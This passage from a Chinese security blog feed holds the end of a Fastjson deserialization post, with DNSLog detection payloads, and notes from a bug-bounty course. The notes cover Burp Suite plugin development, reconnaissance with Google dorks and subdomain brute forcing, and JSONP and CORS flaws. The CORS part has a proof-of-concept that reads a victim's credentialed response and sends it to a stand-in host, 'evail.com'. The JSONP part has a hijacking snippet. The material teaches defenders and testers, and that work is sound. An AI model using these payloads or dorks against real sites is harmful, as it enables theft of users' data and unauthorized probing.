class="line">String payload1 = <span class="string">"&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br><span class="line">String payload2 = <span class="string">"&#123;\"@type\":\"java.net.Inet6Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.b1ue.cn/archives/184.html" target="_blank" rel="noopener">http://www.b1ue.cn/archives/184.html</a><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html</a><br><a href="https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html" target="_blank" rel="noopener">https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html</a><br><a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/</a><br><a href="https://www.freebuf.com/news/232758.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232758.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Fastjson这款国内知名的解析json的组件，笔者在此就不多介绍，网络上有很多分析学习fastjson反序列化
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化 Java" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java/"/>
    
  </entry>
  
  <entry>
    <title>JDSRC安全课笔记</title>
    <link href="https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/"/>
    <id>https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-20T11:01:42.000Z</published>
    <updated>2020-07-20T11:21:37.792Z</updated>
    
    <content type="html"><![CDATA[<p>﻿# 第一期</p><h2 id="逻辑漏洞挖掘"><a href="#逻辑漏洞挖掘" class="headerlink" title="逻辑漏洞挖掘"></a>逻辑漏洞挖掘</h2><p>&emsp;&emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控制缺失，出现任意增删改查用户信息的情况。实际业务场景中，这类漏洞大概两个成因，上线前没有做好认证处理，或权限环节控制不到位。基于工具开发，我们可以通过域名信息收集、站点信息爬取、规则的分析与提取，以及批量处理结果分析与展示四个环节快速发现认证缺失漏洞和认证缺陷漏洞。</p><h1 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h1><h2 id="基于-burpsuite的web逻辑漏洞插件开发"><a href="#基于-burpsuite的web逻辑漏洞插件开发" class="headerlink" title="基于 burpsuite的web逻辑漏洞插件开发"></a>基于 burpsuite的web逻辑漏洞插件开发</h2><p>Burp Suite作为web应用程序渗透测试集成平台,常被用来进行网站渗透测试。BurpSuite 提供了插件开发接口，支持Java、Python、Ruby语言的扩展。虽然 BApp Store 上面已经提供了很多插件，其中也不乏优秀好用的插件，（推荐几个个人感觉好的插件）CO2,Logger++,Autorize,XSS Validator。但是通用化的工具无法完全符合web安全测试人员的特定需求。</p><p>1、为什么要独立开发插件<br>2、开发环境配置说明；<br>3、插件开发关键接口的使用实例；<br>4、逻辑漏洞检测插件开发探讨；</p><p>1.为什么要独立开发插件<br>随着厂商安全意识增强，传输过程中，大多数线上业务通过https传输，传输流量加密。无法做中间人攻击了就，服务端，数据库中的敏感数据加密存储，访问控制受限，即使拿到数据库也无法拿到明文数据。但是数据在客户端最终要展示给用户，必然明文展现。传统的安全防御设备和措施对逻辑漏洞收效甚微，现在攻击者更倾向于在客户端利用此类漏洞。而逻辑漏洞种类很多，通用化的工具无法完全符合web安全测试人员的特定需求。一个业务的逻辑漏洞抽象出来的模型，难以在其他业务层进行批量处理，通用的解决方案往往效果不佳。但是一个业务层抽象出来的模型，在其自身站点往往具有通用性。例如，某URL存在越权，可能该站点其他URL也可能存在类似的问题。我们基于该URL特征，开发burpsuite插件，批量扫描该站点，就能更全面的发现同类问题。因此，我们有必要根据自己的业务需求，自己能够独立开发插件。</p><p>2.开发环境配置<br>Burp支持Java、Python、Ruby语言的扩展，本次讲座以python环境为 例进行说明。Burpsuite 是运行在java环境，所有的库是java所写。Python作为开发语言，调用Java库就要用到Jython。</p><p>以MacOS为 例子进行说明：<br>brew install jython，就可以了，Burpsuite Jython环境的配置：Extender -&gt; options -&gt; python Environment -&gt; select file,导入下载好的jython jar包。<img src="https://img-blog.csdnimg.cn/20200207154012356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.：插件开发关键接口的使用实例，重点讲几个接口</p><p>API接口查阅可以从以下拿到：<br>API接口文档可以在burpsuite 的Extender -&gt; APIs<br>也可以通过<a href="https://portswigger.net/burp/extender/api/index.html进行查阅。" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html进行查阅。</a><br>IBurpExtender<br>IBurpExtender是Burpsuite插件的入口，所有插件的开发都必须要实现。<br>当插件被建立以后，registerExtenderCallbacks也需要实现。<br>代码如下：class BurpExtender(IBurpExtender):<br>def registerExtenderCallbacks(self, callbacks):<br>参数callbacks可获取核心基础库,例如日志，请求，返回值修改等。<br>IExtensionHelpers:<br>提供了编写扩展中常用的一些通用函数，比如编解码、构造请求、获取请求参数，获取请求头等。如：IRequestInfo analyzeRequest(byte[] request)<br>通过analyzeRequest函数，可以拿到请求的细节。<br>通过如下几个接口方法可以拿到。<br><img src="https://img-blog.csdnimg.cn/20200207154237626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>IHttpRequestResponse: 这个接口包含了每个请求和响应的细节。在Brupsuite中的每个请求或者响应都是IHttpRequestResponse实例。通过getRequest()， getResponse()方法可以获取请求和响应的细节信息。</p><p>以registerHttpListener为例进行代码说明：</p><p><img src="https://img-blog.csdnimg.cn/2020020715432066.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图所示，在user 和 webserver之间建立监听，调用HttpListener接口。获取请求，响应的日志。<br>实现这个功能，最重要的是这个方法：    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">register ourselves as an HTTP listener callbacks.registerHttpListener(self)</span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        ## 设置插件名</span><br><span class="line">        self._callbacks.setExtensionName(&quot;getTheRequest&quot;)</span><br></pre></td></tr></table></figure><pre><code> # //如果没有注册，下面的processHttpMessage方法是不会生效的。处理请求和响应包的插件，这个应该是必要的   callbacks.registerHttpListener(self)### processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)，### 在messageInfo这个参数中，我们可以获取到request和response日志。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> toolFlag == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">                request = messageInfo.getRequest()</span><br><span class="line">                analyzedRequest = self._helpers.analyzeResponse(request)</span><br><span class="line">                request_header = analyzedRequest.getHeaders()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    method, path = res_path.findall(request_header[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    host = res_host.findall(request_header[<span class="number">1</span>])[<span class="number">0</span>]</span><br><span class="line">                    url = method + <span class="string">" "</span> + host + path</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> method == <span class="string">"GET"</span>:</span><br><span class="line">                    <span class="keyword">print</span> “[+++++]The URL <span class="keyword">is</span> <span class="string">", url</span></span><br><span class="line"><span class="string">                    print "</span>[+++++]The host <span class="keyword">is</span> <span class="string">",host</span></span><br><span class="line"><span class="string">                    print "</span>[++++] The URI <span class="keyword">is</span> following<span class="string">"</span></span><br><span class="line"><span class="string">                    print path</span></span><br><span class="line"><span class="string">                    for iterm in path.split("</span>/<span class="string">"):</span></span><br><span class="line"><span class="string">                        print iterm</span></span><br><span class="line"><span class="string">                    print "</span>======================================================================================<span class="string">"</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p><code>代码如上所示，就可以打印出URL，HOST，URI日志信息</code><br><img src="https://img-blog.csdnimg.cn/20200207154729683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一个demo。延伸一下，我们在做渗透测试的过程中，往往苦于目录字典不全，我们将这个URI生成目录字典，为目录爆破做准备。</p><hr><p>如果做扫描类插件：<br>class BurpExtender(IBurpExtender,IScannerCheck)<br>callbacks.registerScannerCheck(this);<br>实现IScannerCheck后需要重写被动扫描的函数。<br>doPassiveScan(IHttpRequestResponse baseRequestResponse) {}<br>doPassiveScan这个接口，在baseRequestResponse获取请求和响应数据，并利用这些数据进行基于扫描规则进行扫描。</p><h1 id="第四期-SRC挖掘"><a href="#第四期-SRC挖掘" class="headerlink" title="第四期 SRC挖掘"></a>第四期 SRC挖掘</h1><p>首先将公司架构吧，我们就以京东为例吧</p><p>企业的组织架构信息可通过开源信息获取。<br>常用的方法，通过维基百科，百度百科等确定企业的大体组织架构；<br>zh.wikipedia.org<br>baike.baidu.com</p><p><img src="https://img-blog.csdnimg.cn/20200306154856499.jpg" alt="在这里插入图片描述">结合以下站点信息，进一步确定企业组织架构：<br>国家企业信用公示系统：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a><br>天眼查：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p><p>公司架构确定完成后，我们开始被动信息的收集</p><p>被动信息收集是指不与目标直接交互，通过公开的渠道获取获取目标信息。<br>可从以下几点展开，DNS信息收集，https证书信息，搜索引擎，网络空间安全搜索引擎，基于备案资料信息收集。</p><p>DNS信息收集<br>通过目标站点的域名注册信息，如whois日志进行信息关联。</p><p>国外常用的whois查询站点：<br><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br><a href="https://whois.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://whois.cymru.com/cgi-bin/whois.cgi</a><br><a href="https://whois.arin.net/ui/query.do" target="_blank" rel="noopener">https://whois.arin.net/ui/query.do</a></p><p>国内常用的whois查询站点：<br>[图片]<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p><p>通过whois查询确定注册者，然后关联同一注册者的其他站点信息。</p><p><a href="https://viewdns.info/reversewhois/?q=email@111.com" target="_blank" rel="noopener">https://viewdns.info/reversewhois/?q=email@111.com</a><br><a href="https://whois.chinaz.com/reverse?ddlSearchMode=2" target="_blank" rel="noopener">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p><p>https证书信息，即通过https证书进行信息收集，可通过采用以下几种方式</p><p>基于证书透明度两个站点：<br><a href="https://certspotter.com/api/v0/certs" target="_blank" rel="noopener">https://certspotter.com/api/v0/certs</a><br><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p><p>为方便信息处理，可编写脚本处理：<br>crtFetch -d example.com</p><p><img src="https://img-blog.csdnimg.cn/2020030615473366.jpg" alt="在这里插入图片描述"><br>我们看到就可以梳理出一部分子域名信息了<br>脚本位置：<a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py</a></p><p>该脚本对在线站点获取的域名进行清洗，可获取到单域名SSL证书和通配符SSL证书两类。</p><p>有时候我们可能忽略的地方，有些企业的https证书中的相关域名可在浏览器证书中点击查看；</p><p><img src="https://img-blog.csdnimg.cn/20200306154605875.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200306154625356.jpg" alt="在这里插入图片描述"></p><p>基于goolge hack技术可以查询到很多敏感信息。<br>更详细的用法可在这里查询：<br><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><p>我们常用关键字查询：<br>site：搜索域名的范围<br>inurl：URL格式<br>intitle：搜索的网页标题<br>intext：搜索包含其中文字的网页<br>filetype：搜索文件的后缀或者扩展名<br>cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>link：搜索某个网站的链接<br>info：查找指定站点的一些基本信息</p><h2 id="【查找敏感文件】"><a href="#【查找敏感文件】" class="headerlink" title="【查找敏感文件】"></a>【查找敏感文件】</h2><p>site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite)</p><h2 id="【查找敏感目录地址】"><a href="#【查找敏感目录地址】" class="headerlink" title="【查找敏感目录地址】"></a>【查找敏感目录地址】</h2><p>site:xxx.com inurl:login|admin|manage|admin_login|system|user|auth|dev|test<br>site:xxx.com intitle:后台|管理|内部|登录|系统</p><p>以下可能是我们会忽略的几个关键字查询语句：</p><h3 id="基于备案号，copyright信息查询"><a href="#基于备案号，copyright信息查询" class="headerlink" title="基于备案号，copyright信息查询"></a>基于备案号，copyright信息查询</h3><p>intext:”Tesla © 2020”<br>intext:”京ICP备11041704号-15”</p><h2 id="可以正则的形式"><a href="#可以正则的形式" class="headerlink" title="可以正则的形式"></a>可以正则的形式</h2><p>site:dev.<em>.</em>/signin<br>site:<em>/recover-pass<br>site:smtp.</em>.<em>/login<br>site:/com:</em><br>site:/216.75.<em>.</em></p><p>##基于端口或者端口范围查询<br>site:/com:8443/<br>site:/com:* 8000…9000</p><p>查询到的关键词，利用备案信息可以大致确定各个站点的域名信息。</p><p><img src="https://img-blog.csdnimg.cn/20200306155039691.jpg" alt="在这里插入图片描述"><br>curl <a href="http://www.beianbeian.com/search-1/example.html" target="_blank" rel="noopener">http://www.beianbeian.com/search-1/example.html</a> | grep “<br>“ |  grep -o “www.\w<em>.\w</em>“ | sort | uniq |sed “s/www.//g”</p><p><img src="https://img-blog.csdnimg.cn/20200306155121441.png" alt="在这里插入图片描述"></p><p>不断的根据网络备案/许可证号进行反查，即可梳理更多的资产信息。<br>确定企业的IP段，可基于<a href="https://bgp.he.net/站点进行收集。" target="_blank" rel="noopener">https://bgp.he.net/站点进行收集。</a><br>输入公司名称可查询该公司的IP资产信息，然后正则匹配IP段：<br>cat aa.txt| grep -Eo “&lt;td&gt;.<em>?td&gt;“| grep “href”| grep -Eo “([0-9]{1,3}[.]){3}[0-9]{1,3}/</em>[0-9]{0,2}”</p><h2 id="微信公共号"><a href="#微信公共号" class="headerlink" title="微信公共号"></a>微信公共号</h2><p>基于公众号信息，我们可以挖掘到很多的厂商业务信息。公司的公众号信息可在sogou搜索引擎可以进行查询。<br><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C" target="_blank" rel="noopener">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C</a><br>为便于快速梳理，可用脚本处理。<br>python gongzhonghao.py -d “目标公司”<br><a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py</a></p><p><img src="https://img-blog.csdnimg.cn/20200306155403699.jpg" alt="在这里插入图片描述"><br>这就得到某公司的所有公众号信息</p><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>通过被动信息收集到一批域名，IP信息。以主动信息比较容易忽略的三级域名，甚至四级域名为例进行说明。通配符SSL证书往往是三级、四级域名高效爆破的目标，为批量处理，在crtFetch脚本中提取了需要进一步爆破的三级、四级域名。</p><p>然后进行域名爆破，爆破工具有很多，以gobuster为例进行演示：<br>gobuster dns -t 30 -w  sub_name.txt -i  -q –wildcard -d api.example.com| tee  domains-active.txt</p><p><img src="https://img-blog.csdnimg.cn/20200306155621157.png" alt="在这里插入图片描述"><br>这些三级四级域名，防护往往会薄弱一些</p><p>域名是否存活可利用httprobe工具确定。<br>cat domain.txt | httprobe &gt; domain-alive.txt </p><p><img src="https://img-blog.csdnimg.cn/20200306155753708.png" alt="在这里插入图片描述"><br>也可通过whatweb查看链接的服务器版本，标题等信息，处理结果如下图所示<br><img src="https://img-blog.csdnimg.cn/20200306155835844.png" alt="在这里插入图片描述"><br>为便于批量查看URL内容，我们可通过屏幕截图工具webscreenshot进行处理。<br>具体方法如下：首先将存活的站点截图到screenshots文件夹下面：<br>webscreenshot -i alive.txt -o screenshots -w 20 -m -a “X-FORWARDED-FOR:127.0.0.1”<br>为便于浏览，我们将截图生成一个html文件便于在浏览器查看：<br>for I in $(ls -S); do echo “$I” &gt;&gt; index.html；echo “&lt;\ img src=$I&gt;&lt;br&gt;” &gt;&gt; index.html； done<br>在浏览器中打开 index.html文件，就可看到所有的网页截图了。效果如下图，所有存活站点都在一个页面展现出来。可根据站点内容做进一步的渗透测试。</p><hr><h1 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h1><p>&emsp;&emsp; 在企业级应用开发中，经常会遇到跨域数据交互的问题，例如多个子集应用之间通过跨域获取用户登录状态及身份信息等，从而能够满足现代web应用中的实际需求。因此谈到跨域就要了解下浏览器的同源策略。<br>&emsp;&emsp; 浏览器的同源策略（Same Origin Policy,SOP）,同源要求两个页面具有相同的协议、域名、端口号。当A应用(<a href="https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口" target="_blank" rel="noopener">https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口</a>(提交操作）或者读取接口返回的数据作进一步的处理的话，这时就需要考虑跨域问题了，一般情况下浏览器会阻止这种不安全的跨域行为。但在html语言中，有些标签是具备天然的跨域功能的，比如&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等标签是可以直接跨域请求其它域的资源的，这就催生了JSONP(JSON with Padding)，JSONP本质上是利用了&lt;script&gt;标签的跨域能力。</p><h2 id="JSONP跨域安全开发实践方面"><a href="#JSONP跨域安全开发实践方面" class="headerlink" title="JSONP跨域安全开发实践方面"></a>JSONP跨域安全开发实践方面</h2><p>a.com 想要跨域读取b.com下的/getinfo的返回数据，a.com前端示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span><span class="params">(msg)</span></span>&#123;      </span><br><span class="line"> <span class="keyword">do</span> something();<span class="comment">//回调函数，自定义读取数据后续操作    </span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src =<span class="string">"http://b.com/getinfo?callback=jsonp_callback"</span> type=<span class="string">"text/javascript"</span> &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>b.com后台示例代码如下 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=<span class="string">"/getinfo"</span>,method=RequestMethod.GET)</span><br><span class="line">@ResponseBody</span><br><span class="line"><span class="keyword">public</span> String getToken(@RequestParam(<span class="string">"callback"</span>) String callbackFunction)&#123;  </span><br><span class="line"><span class="keyword">return</span> callbackFunction+<span class="string">"&#123;\"result\":&#123;\"data\":&#123;\"token\":\"18623163885dedec5decbab1.37745340\"&#125;&#125;&#125;;"</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>则此时 而此时b.com 响应报文返回的json数据为：jsonp_callback({“result”:{“data”:{“token”:”18623163885dedec5decbab1.37745340”}}});然后a.com能够获取返回的数据</p><hr><h2 id="jsonp开发实践中经常会出现的一些问题"><a href="#jsonp开发实践中经常会出现的一些问题" class="headerlink" title="jsonp开发实践中经常会出现的一些问题"></a>jsonp开发实践中经常会出现的一些问题</h2><ol><li><p>未正确设置响应报文头Content-Type 而导致的反射型XSS一般来说，默认的响应报文头<code>Content-Type:text/html</code>，则此时容易产生反射型xss，从而进一步获取数据。因此我们可通过设置Content-Type为<code>application/json</code>指明返回的报文体是json格式的，避免浏览器解析执行。这个主要是后端是根据前面传入的callback参数的，因此可能导致反射型xss 。</p></li><li><p>JSONP劫持：有些web应用，尤其是同域名下的不同子域之间，通过JSONP方式传输敏感信息，例如用户信息、支付信息、鉴权token等，就要关注JSONP劫持问题了。</p></li></ol><p>一个简单的劫持的代码片段，对于这种jsonp劫持问题，一般企业是对返回的数据做了脱敏处理。尤其对于 姓名 身份证号 手机号 银行卡号之类的个人敏感信息一般只保留其中的几个字符，其他用*号代替。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span>(<span class="params">msg</span>)</span>&#123;      </span><br><span class="line">   <span class="comment">//alert(msg);        </span></span><br><span class="line">   do_evilSomething();<span class="comment">//发送敏感数据  &#125;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src =http:/</span><span class="regexp">/b.com/g</span>etinfo?callback=jsonp_callback type=<span class="string">"text/javascript"</span> &gt; <span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>不得不提到，JSONP跨域数据传输只能通过GET方式，下面再介绍另外一种跨域方法—CORS。</p><hr><h2 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h2><p>&emsp;&emsp; 我们常说的跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。但是浏览器决定是否阻断此次请求是要看被跨域请求的网站（b.com）的返回头header中是否包含“授权访问标头”—Access-Control-Allow-Origin。</p><p>一个cors请求代码示例：</p><p><img src="https://img-blog.csdnimg.cn/20200515155329679.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515155343926.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 响应中响应首部字段 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 的访问，该首部字段的内容如下：Access-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 。</p><p>&emsp;&emsp; 当然这次请求会成功，但是当我们把上面的代码片段中:<br>xmlhttp.setRequestHeader(“Content-Type”,”application/json”);<br>我们会发现浏览器会多一步操作就是先发送一个 OPTIONS方法请求，通常也称为预请求。火狐等浏览器规定是以下情况的请求需要先进行“预检”。<br>&emsp;&emsp; 当请求满足下述任一条件时，即应首先发送预检请求：<br>Content-Type 的值不属于下列之一:</p><blockquote><p>application/x-www-form-urlencoded<br>multipart/form-data<br>text/plain</p></blockquote><p>&emsp;&emsp; 使用了下面任一 HTTP 方法：<code>PUT DELETE CONNECT OPTIONS TRACE PATCH</code>，还有人为设置了对 CORS 安全的首部字段集合之外的其他首部字段等。如果需要跨域请求带上被请求域的Cookie，则需要响应中响应首部字段：<code>Access-Control-Allow-Credentials: true</code> ，但同时浏览器为了安全起见，同时和<code>Access-Control-Allow-Origin: *</code>使用请求会被直接阻断。</p><h2 id="CORS中开发误配置所导致的安全问题："><a href="#CORS中开发误配置所导致的安全问题：" class="headerlink" title="CORS中开发误配置所导致的安全问题："></a>CORS中开发误配置所导致的安全问题：</h2><p>（1）Access-Control-Allow-Origin 误配置获取敏感数据<br>一般有些应用确实不允许跨域，但若web中间件（例如nginx）上被误配置（尤其和其它应用使用同一个nginx做反向代理【add_header ‘Access-Control-Allow-Origin’ $origin;】）就会造成本级应用被强制允许跨域。<br>(2）本级应用允许跨域，但编写正则可绕过<br>(3)    绕过预检请求的写操作CSRF<br>&emsp;&emsp; 假如应用A与应用B的某个接口之间(数据传输使用json格式)存在跨域资源共享，但应用B未校验Content-Type，因此可通过XMLHttpRequest设置<code>Content-Type为&quot;text/plain&quot;</code>绕过预检请求<br>&emsp;&emsp; 携带cookie发送请求报文到B的服务端。（若浏览器发现B返回的报文头没有<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials: true</code>字段，则不允许读取返回的数据）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonreq</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"https://www.b.com/getuserinfo"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"text/plain"</span>);<span class="comment">//注意这里</span></span><br><span class="line">xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">var</span> res= xhr.responseText; <span class="comment">// 读取返回的数据 </span></span><br><span class="line">location=<span class="string">'http://evail.com?param='</span>+res; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">jsonreq();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;﻿# 第一期&lt;/p&gt;
&lt;h2 id=&quot;逻辑漏洞挖掘&quot;&gt;&lt;a href=&quot;#逻辑漏洞挖掘&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞挖掘&quot;&gt;&lt;/a&gt;逻辑漏洞挖掘&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://summersec.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
